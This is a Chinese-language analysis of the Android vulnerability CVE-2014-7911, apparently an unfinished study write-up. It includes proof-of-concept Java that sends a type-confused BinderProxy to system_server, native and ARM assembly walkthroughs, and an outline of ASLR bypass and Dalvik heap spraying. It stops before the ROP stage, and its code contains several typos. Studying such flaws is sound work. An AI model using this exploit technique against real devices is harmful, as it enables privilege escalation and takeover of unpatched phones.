# CVE-2014-7911

java.io.ObjectInputStream没有检查要反序列化的对象是否真的可以序列化，因此可以构建一个不可序列化的java对象实例，恶意构建其成员变量，当该对象实例被ObjectInputStream反序列化时，将发生类型混淆，对象的Field被视为由本地代码处理的指针，构造恶意的对象可在sysem_server进程中执行任意代码并获取提升的权限。其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。

```java

//构建可序列化恶意对象
Bundle bundle = new Bindle();
AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
bundle.putSerializable("eatthis", evilProxy);

//准备传入system_server的数据
Class stubClass = null;
for(Class inner : Class.forname("android.os.IUserManager").getDeclaredClasses()){
//获取android.os.IUserManager.Stub的class对象
		if(inner.getCanonicalName().equals("android.os.IUserManager.Stub")){
				stubClass = inner;
		}
}
Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField("TRANSACTION_setApplicationRestrictions")
TRANSACTION_setApplicationRestrictionsField.setAccessible(true);
TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(null);
Class proxyClass = null;
for(Class inner : stubClass.getDeclaredClasses()){
	if(inner.getCanonicalName().equals("android.os.IUserManager.Stub.Proxy")){
			proxyClass = inner;	
	}
}
UserManager userManager = (UserManager)context.getSystemService(Context.USER_SERVICE);
Field mServiceField = UserManger.class.getDeclaredField("mService");
mServiceField.setAccessible(true);
Object mService = mServiceField.get(userManager);
//获得跨进程调用system_server的IBinder接口mRemote
Field mRemoteField = proxyClass.getDeclaredField("mRemote");
mRemote = (IBinder) mRemoteField.get(mService);
UserHandle userHandle = android.os.Process.myUserHandle();
setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode());

//向system_server传入不可序列化的Bundle参数
private void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException {
	android.os.Parcel _data = android.os.Parcel.obtain();
	android.os.Parcel _reply = android.os.Parcel.obtain();
	try {
	   _data.writeInterfaceToken(DESCRIPTOR);
	   _data.writeString(packageName);
	   _data.writeInt(1);
	   restrictions.writeToParcel(_data, 0);
	   _data.writeInt(userHandle);
	   byte[] data = _data.marshall();// 序列化，获得一个byte[]数组
	   for (int i=0; true; i++) {
// 将这个数组中的”AAdr”修改成”andr”，要传输的对象的类型是AAdroid.os.BinderProxy，所以这里相当于把对象类型修改成了android.os.BinderProxy，这样就成功发送了恶意的对象
	       if (data[i] == 'A' && data[i+1] == 'A' && data[i+2] == 'd' && data[i+3] == 'r') {
	           data[i] = 'a';
	           data[i+1] = 'n';
	           break;
	       }
	   }
	   _data.recycle();
	   _data = Parcel.obtain();
	   _data.unmarshall(data, 0, data.length);
	   mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0);
// Binder客户端的的mRemote其实是个BinderProxy类，使用transact方法描述符和参数传递给服务端进行远程调用
	   _reply.readException();
	}
	finally {
	   _reply.recycle();
	   _data.recycle();
	}
}
```

android.os.BinderProxy这个对象本身是不可序列化的，但是因为ObjectInputStream这个对象在反序列化时没有做校验，造成了类型混淆(type confusion)漏洞。BinderProxy的field被Native代码处理成指针，这个field就是我们在代码中设置的mOrgue。BinderProxy的finalize方法调用了Native代码，将mOruge处理成指针。

## Native分析：

假如BinderProxy可以被序列化，那么在反序列化时，其field引用的对象也会被反序列化；但在POC中ObjectInputStream反序列化的BinderProxy对象实例不可序列化，这样在ObjectInputStream反序列化BinderProxy对象时，发生了类型混淆（type confusion），其field被当做随后由Native代码处理的指针。这个field就是之前设置的0x1337beef，就是mOrgue这个变量。

反序列化的时候调用java.io.ObjectInputStream对象的readObject()方法，这个方法从输入流中读取出对象，也就是我们定义的BinderProxy对象。这个对象被创建后，因为代码中没有再引用它，所以它会进入到”可复活状态”，准备被GC回收，在回收前就会调用它的finalize()方法。

android.os.BinderProxy的finalize方法调用native代码，会将mOrgue处理为指针：

```java
@Override
protected void finalize() throws Throwable {
	try {
				destroy(); // android_os_BinderProxy_destroy
	} finally {
		super.finalize();	
	}
}
```

其中destroy函数的cpp代码:

```cpp
static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj)
{
	IBinder* b = (IBinder*)
		env->GetIntField(obj, gBinderProxyOffsets.mObject);
// 上面提到我们传入的mOrgue的值，即是drl->decStrong方法所在类DeathRecipientList的this指针。
	DeathRecipientList* drl = (DeathRecipientList*)
		env->GetIntField(obj, gBinderProxyOffsets.mOrgue); // mOrgue被处理成了一个对象指针
	LOGDEATH("Destroying BinderProxy %p: binder=%p drl=%p\n", obj, b, drl);
	env->SetIntField(obj, gBinderProxyOffsets.mObject, 0);
	env->SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);
	drl->decStrong((void*)javaObjectForIBinder);
 // drl就是mOrgue，可以被攻击者控制。drl->decStrong方法调用使用的this指针可由攻击者控制。
	b->decStrong((void*)javaObjectForIBinder);
	IPCThreadState::self()->flushCommands();
}

//其中decStrong定义在DeathRecipientList的父类RefBase中
void RefBase::decStrong(const void* id) const
{
	weakref_impl* const refs = mRefs;
	refs->removeStrongRef(id); // 空实现
	const int32_t c = android_atomic_dec(&refs->mStrong);
	#if PRINT_REFS
	ALOGD("decStrong of %p from %p: cnt=%d\n", this, id, c);
	#endif
	ALOG_ASSERT(c >= 1, "decStrong() called on %p too many times", refs);
	if (c == 1) {
		refs->mBase->onLastStrongRef(id); // 导致代码执行，并最终指向可执行的内存区域
		if ((refs->mFlags&OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) == 	OBJECT_LIFETIME_STRONG) {
			delete this;
		}
		refs->decWeak(id);
}
```

对Android::RefBase::decStrong进行逆向，IDA打开libutils.so：

mRefs是RefBase对象中第一个成员变量，RefBase是DeathRecipientList对象的父类，在C++中，对象的内存布局是先放置父类，然后放置自己的成员。而一个对象中方法是不占空间的，如果有虚函数会有一个虚函数表的地址(4字节)放置在对象的最开始，然后放置各个成员变量。这个类是有虚函数的，所以这里的mRefs变量的地址是DeathRecipientList对象也就是我们设置的mOrgue指针指向地址+4。

```bash
# drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域
ldr r4, [r0, #4]   # mRefs被加载到r4，r0是drl的this指针，mRefs是虚函数表之后的第一个私有变量，因此mRefs为r0+4所指向的内容
mov r6, r1
mov r0, r4         # r4指向mRefs，r0指向mStrong
blx <android_atomic_dec ()>    #android_atomic_dec函数被调用，传入参数&refs->mStrong

# 进入android_atomic_dec ()
# 为了调用refs->mBase->onLastStrongRef(id)，需要使refs->mStrong为1
cmp r0, #1          # r0 = refs->mStrong
bne.n d1ea
ldr r0, [r4, #8]    # r4 = &refs->mStrong
mov r1, r6
ldr r3, [r0, #0] 
ldr r2, [r3, #12]
blx r2   # 执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。
```

mStrong是refs（类weakref_impl）的第一个成员变量，由于weakref_impl没有虚函数，所以没有虚函数表，因此mStrong就是r4所指向的内容。另外，refs->removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。

## 绕过ASLR：

Android上有地址空间随机化(ASLR)，但是因为所有app都是fork自zygote进程，所以基础模块和dalvik-heap的内存布局全都是相同的。可以分析自己的内存布局获得system-server的内存布局，然后使用基础模块构建ROP链就可以绕过ASLR。

## Dalvik-heap spary：

为了能让blx r2这条执行能够可靠稳定的跳转到攻击者可控的代码，需要利用堆喷射技术，在system_server内存空间的dalvik-heap中预先布置大量的Spray Buffer, 其中放置提权代码以及大量指向该提权代码的地址。

向sysetem_server的dalvik-heap空间传入可控字符串，system_server向android系统提供绝大多数的系统服务，通过这些服务的一些特定方法可以向system_server传入String，同时system_server把这些String存储在Dalvik-heap中，在GC之前都不会销毁。

（Some problems happened，To Be Continued…）